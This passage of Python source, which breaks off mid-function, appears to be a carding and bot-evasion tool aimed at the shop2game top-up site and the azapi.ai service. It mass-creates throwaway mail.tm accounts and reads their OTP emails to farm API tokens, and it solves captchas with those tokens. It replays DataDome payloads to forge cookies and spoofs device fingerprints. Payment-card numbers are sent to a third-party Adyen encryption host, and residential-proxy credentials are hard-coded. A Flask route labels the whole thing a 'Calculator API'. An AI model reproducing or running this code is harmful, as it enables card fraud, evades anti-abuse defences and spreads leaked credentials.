import requests,json,base64
import uuid
import time
import hashlib,random
import user_agent
from flask import Flask, request, jsonify
import urllib.parse
from collections import deque
import string
import re
from bs4 import BeautifulSoup

BASE = "https://api.mail.tm"


# -----------------------
# توليد اسم عشوائي
# -----------------------
def random_string(n=10):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# -----------------------
# جلب الدومين
# -----------------------
def get_domain():
    r = requests.get(f"{BASE}/domains")
    return r.json()["hydra:member"][0]["domain"]


# -----------------------
# إنشاء حساب
# -----------------------
def create_account(email, password):
    r = requests.post(f"{BASE}/accounts", json={
        "address": email,
        "password": password
    })
    
# -----------------------
# تسجيل دخول
# -----------------------
def get_token(email, password):
    r = requests.post(f"{BASE}/token", json={
        "address": email,
        "password": password
    })

    
    if r.status_code == 200:
        return r.json()["token"]
    return None


# -----------------------
# Headers
# -----------------------
def auth_headers(token):
    return {"Authorization": f"Bearer {token}"}


# -----------------------
# جلب الرسائل
# -----------------------
def get_messages(token):
    r = requests.get(f"{BASE}/messages", headers=auth_headers(token))
    return r.json()["hydra:member"]


# -----------------------
# جلب رسالة كاملة
# -----------------------
def get_message(token, msg_id):
    r = requests.get(f"{BASE}/messages/{msg_id}", headers=auth_headers(token))
    return r.json()


# -----------------------
# تنظيف HTML
# -----------------------
def clean_html(html):
    if isinstance(html, list):
        html = "".join(html)
    if not html:
        return ""
    return BeautifulSoup(html, "html.parser").get_text()


# -----------------------
# استخراج OTP (ذكي)
# -----------------------
def extract_code(text):
    if not text:
        return None

    # يبحث عن OTP Code: XXXX
    match = re.search(r"OTP\s*Code\s*[:\-]?\s*([A-Za-z0-9]{4,8})", text, re.IGNORECASE)

    if match:
        return match.group(1)

    return None


# -----------------------
# مراقبة البريد
# -----------------------
def watch_inbox(em,token, delay=5):
    seen = set()

    
    while True:
        messages = get_messages(token)

        for msg in messages:
            if msg["id"] in seen:
                continue

            seen.add(msg["id"])

            full = get_message(token, msg["id"])

            sender = full.get("from", {}).get("address")
            subject = full.get("subject")

            html = full.get("html") or ""
            text = full.get("text") or ""

            # حل مشكلة list
            if isinstance(html, list):
                html = "".join(html)
            if isinstance(text, list):
                text = "".join(text)

            clean_text = clean_html(html) + "\n" + text

            

            code = extract_code(clean_text)

            if code:
                
                ok=votp(em,code)
                if ok:
                	ok1=(vpas(em))
                	return
                	
                
            else:
                pass

            
        time.sleep(delay)



def watch_inboxlogin(email,token, delay=5):
    seen = set()

    
    while True:
        messages = get_messages(token)

        for msg in messages:
            if msg["id"] in seen:
                continue

            seen.add(msg["id"])

            full = get_message(token, msg["id"])

            sender = full.get("from", {}).get("address")
            subject = full.get("subject")

            html = full.get("html") or ""
            text = full.get("text") or ""

            # حل مشكلة list
            if isinstance(html, list):
                html = "".join(html)
            if isinstance(text, list):
                text = "".join(text)

            clean_text = clean_html(html) + "\n" + text

            

            code = extract_code(clean_text)

            if code:
                return vlog(email,code)
                
                
            else:
                pass

            
        time.sleep(delay)


def otp(em):
	url = "https://app.azapi.ai/api/register"
	
	payload = {
	  "email": em,
	  "referral": ""
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://app.azapi.ai",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://app.azapi.ai/signup",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200:
		return True
	else:
		False

def votp(em,code):
	url = "https://app.azapi.ai/api/verify-otp"
	
	payload = {
	  "otp": code,
	  "email": em
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://app.azapi.ai",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://app.azapi.ai/signup",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	
	if response.status_code == 200:
		return True
	else:
		False

def login(email):
	url = "https://app.azapi.ai/api/login"
	
	payload = {
	  "email": email,
	  "password": "AnA##AnA1"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://app.azapi.ai",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://app.azapi.ai/",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	
	
def vpas(em):	
	url = "https://app.azapi.ai/api/set-password"
	
	payload = {
	  "email": em,
	  "password": "AnA##AnA1",
	  "confirm_password": "AnA##AnA1"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://app.azapi.ai",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://app.azapi.ai/signup",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	
	if response.status_code == 200:
		return True
	else:
		False

def vlog(email,code):
	url = "https://app.azapi.ai/api/verify-login-otp"
	
	payload = {
	  "otp": code,
	  "email": email
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://app.azapi.ai",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://app.azapi.ai/",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	
	token=(response.json()['data']['token'])
	sandbox_token=(response.json()['data']['sandbox_token'])
	return token,sandbox_token

def final(token,email):
	url = "https://app.azapi.ai/api/client"
	
	payload = {
	  "first_name": "michal",
	  "last_name": "aguro",
	  "email": email,
	  "secondary_email": email,
	  "mobile_no": "12015589645",
	  "company_name": None,
	  "address": "new york city 0099",
	  "country_id": 1,
	  "country_code": "+93",
	  "state": "new york",
	  "city": "new york",
	  "postal_code": "10090",
	  "tax_number": None,
	  "profile_type": 0
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'Authorization': token,
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://app.azapi.ai",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://app.azapi.ai/profile",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  
	}
	
	response = requests.put(url, data=json.dumps(payload), headers=headers)
def generate_token():
    domain = get_domain()
    email = f"{random_string()}@{domain}"
    password = "Test12345"
    otp(email)
    
    create_account(email, password)

    token = get_token(email, password)

    if token:
        watch_inbox(email,token)
        login(email)
        time.sleep(2)
        okk=watch_inboxlogin(email,token)
        final(okk[0],email)
        return okk[1]
    else:
        return "❌ Failed to get token"






app = Flask(__name__)

@app.route("/")
def home():
    return jsonify({"message": "Calculator API is running"})






def useragent():
	return user_agent.generate_user_agent()

proxy = "proxy.geonode.io:9000"
user = "geonode_uRNuT13e50-type-residential"
password = "d036a1a3-9d17-46a4-9510-e3752c6aa540"

proxies = {
    "http": f"http://{user}:{password}@{proxy}",
    "https": f"http://{user}:{password}@{proxy}"
}


def time_based_uuid():
    # current time in nanoseconds
    timestamp = time.time_ns()

    # random uuid
    random_part = uuid.uuid4().hex

    # combine time + random
    raw = f"{timestamp}-{random_part}"

    # hash result
    result = hashlib.md5(raw.encode()).hexdigest()

    # format like UUID
    formatted = (
        f"{result[:8]}-"
        f"{result[8:12]}-"
        f"{result[12:16]}-"
        f"{result[16:20]}-"
        f"{result[20:32]}"
    )

    return formatted


import requests
def adyenencrypt(cc,useragent):
	c=cc.split('|')
	cc=c[0]
	exp=c[1]
	exy=c[2]
	try:
		exy=exy[2]+exy[3]
	except:
		pass
	cvc=c[3]
	headers = {
	    'authority': 'asianprozyy.us',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://scbphil.com',
	    'referer': 'https://scbphil.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': useragent,
	}
	
	json_data = {
	    'card': f'{cc}|{exp}|20{exy}|{cvc}',
	    'adyenKey': '10001|9EE3CE9D20888B0E8D8BB509B891B16A412CB493760368D3F6FE4B853DA3F3EC8CC349E14F15DEC520650CD03E770230AE6D29CC8A3231F9F5E5604D17E99043688BB0E8FE0C29AAE8E604152445582A06F02DE7D8C0EAF0184DC1F922C7E11C2B803F2824FA93DCA8FF94E4F3D4716010CBA24A4DA2010969A704306E7B1B81A0349EEA32C251070B0C7573229FD03476FA8D10546A30ED58A14B04E5AE8B56C762BEB787682B41D3B5C4671E9F84C552DC2A2CD613B57FE40DB4AC68262D4A1BF250D811A67609F7FB66F9332BDCA8BFEDEE9641E82A237189E3810D9963BA885332DF8894322696838E62C3D6E60B4989033BD2EBF25EB6697CB84D53A2F9',
	    'version': '25',
	}
	
	response = requests.post('https://asianprozyy.us/encrypt/adyen', headers=headers, json=json_data)
	re=(response.json())
	cc=re['encryptedCardNumber']
	exp=re['encryptedExpiryMonth']
	exy=re['encryptedExpiryYear']
	cvc=re['encryptedSecurityCode']
	return cc,exp,exy,cvc


import requests

def captcha(useragent,keycaptcha,aut):

    url = "https://gop.captcha.garena.com/image"

    params = {
        "key": keycaptcha
    }

    headers = {
        "User-Agent": useragent,
        "Accept": "image/*,*/*;q=0.8",
        "Referer": "https://shop2game.com/"
    }

    while True:
        r = requests.get(url, params=params, headers=headers,proxies=proxies, timeout=30)
        data = r.content

        # تأكد أنها صورة JPEG حقيقية
        if data.startswith(b"\xff\xd8"):
            
            api_url = "https://api.azapi.ai/t0001c"

            api_headers = {
                "Authorization": aut,
                "Content-Type": "image/jpeg",
            }

            resp = requests.post(
                api_url,
                headers=api_headers,
                data=data
            )

            try:
                result = resp.json()
                return result["output"]["captcha"], keycaptcha

            except:
                print("API Error:", resp.text)
                return None, keycaptcha

        else:
            print("Invalid captcha response:", r.status_code)
		


def loginid(idplayer,useragent):
	import requests,json

	url = "https://datadome.shop2game.com/js/"
	
	payload = {
	  'jspl': "_7uxD0hlb8rAGYW1o4lXWZU0pyOMKrUcHFDYCTtHC0YGDPTPGx_QwWQsBoj1x0diyhGigug7Wbx1XfzCxWNEV2bUciwT4lo4uoJhwb5Y7jxvPT1Xf5sYU-YjSydhfpZ0sacJOTHpBwnkYMqFXgGDN6-8cqekMCjJwQ5TpN5hJiZGA86mFDsOZuWyvQ-NAVGf1G4kUG1_zJhcgWdYXuqxGy8bSB3-RMg7GybpJeSy9NqyimRAm1sEGwnzzVJ8LPVc88pZsqinjmelqEMuRrQ2_Rt7TmJ2QC5kc_eHjKDtovedpTp0xa8RoC8txfefMfUhSwNLFZzhfCCKgaealbl2KO3fpa5mEttv5c0Vf1fQ9o0ZYXqutMsC-zVj14rJcnepUV4eQEZMSgyMimbgY8ovsQVE5BPWyUzdsRLtJWsp5LA_oHJOy7qDi5U5vFzyNyHHscDHflxbySk1Nw1KicUZQ92Bjz75DaCr1AzAPCnG7eQ6NMbbHuidJwkrLvo009zVUc82n6WQtrZT5RHQM3wvkRyjajDldB0xA2dLnsPhA3l1i9JyeMzkbO9Esb7FmaC1Izlvq3nzwIdmMfQCF36Gni0LmHJOXxmjXFVUn--4wb40rub70HNJwndlACiPWq8hnEauSELv6Ftdx1sDXHiSdEh5U15yc4HFglYGkcZb_NWX12LNaA-HeRK6OSmT0l115pEhMNRoME7lIkP7RlCQ772h-c6PDsxs7OrfFRdWUCjlc7FFgihyGd3JJ9kzytcU4__A2Eb6wY4f7Ea5_0NGFIKWm0fCGfjbTskYBXvpD-b1ZYHz2WmgWNcyergPtI-poViP4Tur_3bTkfNwSJYTfDMY0-ao9QRSgzuFIA89MNDGKA3-w14kEEWSZbg5M8PLI95DV83_ZDkhQrIao6GEVEtwH_0cHslt6s7ea55GNzhcYvhjwJDbV7-H60mnjl1Bn8g7h10rApclWj2AnfrOlKSWlRdsiGIvRax6-YCRa8e5egcZaOJjxJ7JmOzNSKjynnnRvACQ7W-Asr7AfWWwBAwVHE8_UuSCwwN_n1lBgPNcvjBWLWGYgPLR3NFR-f1XFxs2I8H41NXoziTAhmT6QHQIP-8OyIKNLu6trtDtJpzxDkvVYlFDK_rZHYkQcTIsgGhxhtghV3KSCz46smclFxlXoCONcuHIL_aBwbmTG4pVx4CUHuTZyL-pNz_5YUgEaGxHATKmA4FJ1cMjs-4wBeBnq7ho8501EMu-4JrUr69kibArxEYO8d0iLJK0IrxIsY5rNaimFkz3TorvloSB8amj5UnDGYitpm8QD56Re13YqC6A3-wh3ZsIX4Y9kYEl6xfPQcZutVtC6cn-NSQXek7yMowKjVt5DC-EgTuFo4x481nS1-hj3W5Ymyrof6KX7JM7gXAFY0bGwwCk9SeG3JBbUxawxth4-ddKVI7Ufx_8Rd7Fr9IqSxeNU26-OOxDWdu1gf5IvvqzDaOYBad-7Vcc4ffSKYQzP2JLRXqgh0-pQWRC1pfnyO-L_qwCr63O92pKDcseezWEk467UkCx3KLKt3oLT5KLv62cS7NOEo02_Okff-HpCadou7tcz0aWl1znOrHZl1F36YW-9WKCqcmPcZM5FWQnk6ng1P6Ng2ScjaDE32CToy-bYfCTfzcBMIzzNotue20yRrPijaUS60CR0JQphjtguRxHK9Q3neK1RuMyp3y-_kWc3MH2JWbRrW1_fQMFB1D522sZ3SUwP4ePK3g2kSQ8q0SmHS_9K_nc1d8tLUTY9HJcYw4yWL1S2GdpkIswNn6xcrlLmVuVgFt6pKU1Mhrgs8jVNzDdzBOHCRnN9JY8s3we1OBCqf5fmXWOacoEXQIwoaNDCmCxuMpN1FPhyTwqfvCaVZURMgWTD-Lye3fUGixe-Csf0CIDKk2tZoX_lDbquGDAFfrga2VnYzIDqx8G5gyk5nV9RCRo8tCD3pi_V6MbU39g3q9RS871P7kmUAIBQj-0yyHbfqECp1yESsTMJGbdFgzWpzE-LbasWKja67XJxedSP0sFFT-x06szNtgRfXycAMYClRkRL0vwaTMvB87jUYyR7E01ry_wxNpEJDDtTePEMHZFYItehdBJMbzdlcheLMqfwl6SuXGmV14GP9RyEZ4u1iCrj4pLaaBEcULGU_xsm7ncjKEP3vSmqWrKAtrIENtM1Ai0VztB0gtStYjTOYO3ZYr4uWRaR1IU1LzzNm9uOpKeFK2T6Fv8gPulm_bPSDvJFd4aRMaQO8iyqxUphegt72IY71ck1wUAI7Y5C6U23den9CFMhYMSEe5UdGNCilhxnTsiw5YYXakAB02yo-S1-hvSO9GSparMuRG37ximW7wW4wdtxOFm_JI6WGO45eF5bH1T1ly-CYrtM4W4jPQ93KL_6gjhNNns-YGnO-xfIlHdg-adK6A-U9S0IBODCcwelyCnw1XMMn5TNANpfGPxyOOl0UKWI0N5IOQFOxNSq0twbv7rEZ6MJGqHdaxyFsjju4czbrYn5tv4KGsi180PU7b8IU_CtDB_0BVuYnbb4-Zn0NY9yKKJI0htJiCsfzzL6n4uGhMmR1bGCAiUaYVD9rfo-cv1ILGuHhZnxhopFPy9Bx9e3zKMQsMlg5y7qE7ojrkymzllyxGoXSR28nt9pQXs2-Afryc3ztkJhijQMDEkVQ3SjndOynVx78JXTtfYAlPrsg1aOhc4Ke_4Gti_Uey6WgRqngftwJBXXff9d2D5ND6n7RqVlGJW-ikGSpkmSv8pAfiivN3czbJ9_Vb_6e9yZ2H2TA8pGm6rWow_ExOkkreRQ34HvU2N8SoPBSqjZqxCpGVnwv1O5tt7mYgInVTkR_TgIv-6irossf_h1J2EObo34xtA5VpYcrvML7ipo51GRMYoNuO0Swp8niYJgxjNLFBuIkoVBtUoGXWyzma1RA3PasX_jyULf8YQRPqcULVrHjeHUov2Se0s_Ava0QL6lC0qA359KH2OiHlIFRqSUoQ4q3gQkM8O8985bE-o_NkR_hjPs1K4vLtLSWikWdCww3fYVBvVYroWoKr1BH8IyfbXHrnY2RfdJS-SnKZwglSMx0ktwCAHl9G-wWSpPv4VvIFOOiOkaaodmhbHe2g0SkDkw8ABVInCjJoe_GInJEglebLALWlN-medFXTjMZzzLeVh5adQi7i7mSNwX5kSDyCGB1pCyp5YyP-0hlSXuScRhwjNZd9e-RI7LCtTj3P_pNIJtYNzvnKmyf9-vst8zaEZ8bx7D05HpdMfQ3iy_A4YglkVlwhIKZL9WZEfTbzI1w_sLpRlMUUm7JVvB1ruvJTpiWZlya5eYO3iBlDbaf94-f21AS71R6NOVo8A_-N1rE_a64zjN03ukYy0jLd8C0R3LS3ii3gb-6Y1reBDXV7PuG2Q2z6DpvDHs4wbpO6xoWHpRSGtcuwkPsqHG2yzIHOVbL96FXqHwbkrS0wimJYBRcZ2ZDsfnQHtDGz2xsnbwVNPbGtRM_WdEBBUAE0MEmYjLy3EgXv6XzaP552Dq06duNDVrisr3tIQKEljvUpJXfXIEsjLAviXW6LSu33SgQNoBcWdqTTzX2VFyPAiEyqNdkLYQdMS8dPNp9J9b0M1MQKPx15QUMfS_0hDLwl81DuqHMffCfSfJMeoxg0eC0kwGLLbVEfNj47LnmJ4sbCeDTW_2JWkuJA_vsFnodP2MEj3-rW1poXlKDkkKc85vCZNznK_OPSIIK07YKTelxmaqxfZ472DtmxGFGgjyK-ZUMfV0ut-Of4k0pPwNCBk4HacN3NGFJDG4td8-axBdnRDHuNBlIuI8xW4aHf0_3CDpgOHhr8STyub8_wN4aB9w11xzyEAiyXPP6BpxVAkhZI4L5BE7a6Yk1W09XlDSLNrWYP5oalxziGV-h0U8gC2zDPAnTfMMKKZEagOQ6vz6__MGvSFHhSKybKrXwWBTmhZFtggHg4gNEY-akeSVkZqvq7_Rq2jH5SYNRwxUtSepXKdPzsliL-dXIxeLBbIEhwUIEeZrRedJ1Y8tRz5tvV30dpxSAAWclcQxILALZGcoYl81L_d-13x-eWZeeMORRRqD7wW_l4rtEmgt1O5UTq9iEjBr9B2_JTG-cvN9SSyskJCRPa-LMNRxeaKNlq4unhLs5SD8UWTlOWMkXjg4vPj77_o7q879AYqSV0mgZXKsiOfZmOLnVGu0FyZsAH8I1Bm2EGqjgCjPttERV3t0HZGSFkApU-fB3_v7vVP4eA5o1koP-WFwzfg-vlC3Q2Fi9z9aMuo32Fv4-k-cqHU8XLl4hff9E46nZltLfrSFGOQTSlc4gKh-S7Qr0groBg3O0Fmf_p1qUSGwCuG0laiZbo3m2FWwIxs5GayNdu7uao_8VxgeT4wMFIjeHJ3Z07YL_xb9G7xPqG_FFQxokoOMPJgaoy3bc2K6GgMQtO5e_FwYoa95QQczNeVN5m8OBM3tJIu4V3VfSNRnPPqfYB6yMikNT_630ds5HSaR-OWtYvKEThgCW-RqnyXe9cG0UJrU0IDng1xZZOHOIHUxuVdTGgKXkUTiha0qFABSVhnx_1zCJul72ygDTp4L5WelPgjBtZUxfKVIb330X8gES-ABEunXhd6aoQzOxPzXALdHaEITmPVpucoN41yNBs3VD9BI1g8qySW1mOy3huKMXMYXcxhfqdBsoOmPBastStCENNhxd2le_Y_5aXIoIOc8PAQHGZeYNDUoTNDeRf_8HN4P7qtjpB45_NXa-i-CdgjJUBUbrgU5hrnekxnEyJpXyVL2JEyMQNq0TH2Y4B5f7uG9n7l_CIsEW8DtbDVrH637v_v1Qx8eAYCuSR1ChgP3RtXwVasMNRTyNryTi0fIDEL5KwhbEPd6k7VMBW3IkSxrR9CD5aCnkBg8z8xXrPpYMKOoxJ7qXXveu8gzuve6gLjODpkRv208HGxlAl-WX0j8CvZAnEtPlqGVIRMJVLm2fkq-qFvLXtx9zHh0jV4DOgf5OYzOoBQw5g93LQMQ-skOncKmqYWTTkapkaYkSD22CR5wOcCkWUYOu75wRRlZnRqE56c9JQupuvAxjyuDftYWOIx3jR9kUM3yR-c_a188sEpF3vSj3rQlEHw8wFvmvTalxeQ-Evbvq7bU0GT_tRu8zAK7M-Xkr7vnLn30zRIGu0WPjM8OziSSUlMEv4nAk9iy8ZFrk2oL9SI5Zy5SBVn-SmwPjjL5kHxljzV6v77aEGnAgYLmc3wqmPVr9mRBVsxqlAWbsqB8Ne3zd8aLL5FbZ2LVAr-I6hoEQmyQnfzZWUnEgkrZomFccPX-C70qiJ5RaHvttov1C65pywJFSRofaG183CHbOKrwwvLhYSgd2zeSjx39fGbd7v44xyJV7KlzvtjSsTpplJwClUvxohTCx3v4biKTJmVAYtSbf-NOUPhg__QIrFa8CnexxMr-9VqB-wUpQ29YhxKPYDpBqZrmIiCMTVdsXP3wT6Q4ZJkwS0FXG46XWxpRD1GOlr82L0bo4uDYM6OKYOQCg4wo55cHd10XSC8aitnoXkXY3O5hOtGG6-qZPzVD5_3cmUXHbwnLR2-oMS483JqaYowZ-IgPHd13bTvUrBl89LpnZ_ukBeXqhP_RUU9o2AUIGfJb_xMva-8RTwtOaHPfFHDj88vQzedxefH2pr-HVKta6Oxlf3HSSFFMLeYF8ZaDt66P0NlijilZzMMekK_oEyUKKteLGGqR3bSh5t7t8t_zhdIxYNGOwxczaqhbdIMXpNNSk3Gd8olnCi5RaBNA5ELULFXiB27147jh0Qnaz0rQzTSZN_26SxuhJfc",
	  'eventCounters': "{\"mousemove\":2,\"pointermove\":15,\"click\":2,\"scroll\":68,\"touchstart\":4,\"touchend\":4,\"touchmove\":8,\"keydown\":0,\"keyup\":0}",
	  'jsType': "le",
	  'cid': ".keep",
	  'ddk': "AE3F04AD3F0D3A462481A337485081",
	  'Referer': "https://shop2game.com/?channel=230199&item=26781",
	  'request': "/?channel=230199&item=26781",
	  'responsePage': "origin",
	  'ddv': "5.6.4"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-ch-ua-mobile': "?1",
	  'origin': "https://shop2game.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://shop2game.com/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	r=requests.session()
	response = r.post(url, data=payload, headers=headers,proxies=proxies, timeout=30)
	
	cookie_str=str(response.json()['cookie'])
	datadome = cookie_str.split("datadome=")[1].split(";")[0]
	
	
	
	url = "https://shop2game.com/api/auth/player_id_login"
	
	payload = {
	  "app_id": 100067,
	  "login_id": idplayer
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://shop2game.com",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://shop2game.com/?channel=230199&item=26781",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "datadome="+datadome
	}
	
	response = r.post(url, data=json.dumps(payload), headers=headers,proxies=proxies, timeout=30)
	return response.cookies['session_key'],datadome
	


def random_hash():
    return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()


data = {
    "version": "1.0.0",
    "deviceFingerprint": str(uuid.uuid4()),

    "persistentCookie": [
        f"_rp_uid={uuid.uuid4()}"
    ],

    "components": {
        "userAgent": random_hash(),
        "webdriver": 0,
        "language": random.choice([
            "en-US",
            "ar-EG",
            "fr-FR"
        ]),
        "colorDepth": random.choice([24, 32]),
        "deviceMemory": random.choice([4, 8, 16]),
        "pixelRatio": round(random.uniform(1, 3), 2),
        "hardwareConcurrency": random.choice([4, 8]),
        "screenWidth": random.choice([720, 1080, 1440]),
        "screenHeight": random.choice([1280, 1920, 2560]),
        "timezone": random.choice([
            "Africa/Cairo",
            "Asia/Riyadh",
            "Europe/Paris"
        ]),
        "platform": random.choice([
            "Linux armv81",
            "Android",
            "Win32"
        ]),
        "canvas": random_hash(),
        "webgl": random_hash(),
        "fonts": random_hash(),
        "audio": random_hash(),

        "botDetectors": {
            "webDriver": False,
            "cookieEnabled": True,
            "headlessBrowser": False
        }
    }
}







def getcsrf(ses,datom,useragent):

	url = "https://shop2game.com/api/preflight"
	
	headers = {
	  'User-Agent': useragent,
	  'Accept': "application/json, text/plain, */*",
	  'Content-Length': "0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://shop2game.com",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://shop2game.com/buy?app=100067&channel=230199&item=26781",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': f"datadome={datom}; session_key={ses}"
	}
	
	response = requests.post(url, headers=headers,proxies=proxies, timeout=30)
	
	cf=response.cookies['__csrf__']
	
	url = "https://shop2game.com/api/preflight"
	
	headers = {
	  'User-Agent': useragent,
	  'Accept': "application/json, text/plain, */*",
	  'Content-Length': "0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://shop2game.com",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://shop2game.com/buy?app=100067&channel=230199&item=26781",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': f"session_key={ses}; __csrf__={cf}; source=mb; language=ar; _ga=GA1.1.1035337237.1778540731; datadome={datom}; region=ME"
	}
	
	response = requests.post(url, headers=headers,proxies=proxies, timeout=30)
	
	return response.cookies['__csrf__']


def session_id(ses,datom,cf,useragent):
	
	url = "https://shop2game.com"
	
	params = {
	  'channel': "230199",
	  'item': "26781"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'Cache-Control': "max-age=0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
